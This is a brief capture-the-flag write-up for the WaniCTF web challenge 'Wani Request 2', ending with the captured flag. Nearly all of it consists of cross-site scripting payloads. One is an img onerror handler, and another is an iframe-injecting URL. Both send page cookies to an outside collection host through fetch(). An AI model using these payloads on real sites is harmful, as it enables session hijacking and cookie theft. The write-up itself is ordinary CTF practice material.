# Wani Request 2

# page 1

```
<img src=x onerror="fetch(`https://progfay.free.beeceptor.com?${document.cookie}`)">
```

## page 2

```
https://request2.web.wanictf.org/page1?wani=<iframe id="page2" src="https://request2.web.wanictf.org/page2"></iframe><img src=x onerror="fetch(`https://progfay.free.beeceptor.com?${document.getElementById(`page2`).contentDocument.cookie}`)">
```

In page 1:
```
<iframe id="page2" src="https://request2.web.wanictf.org/page2"></iframe><img src=x onerror="fetch(`https://progfay.free.beeceptor.com?${document.getElementById(`page2`).contentDocument.cookie}`)">
```

## Flag

`FLAG{y0u_4r3_x55-60d_c75a4c80cf07}`

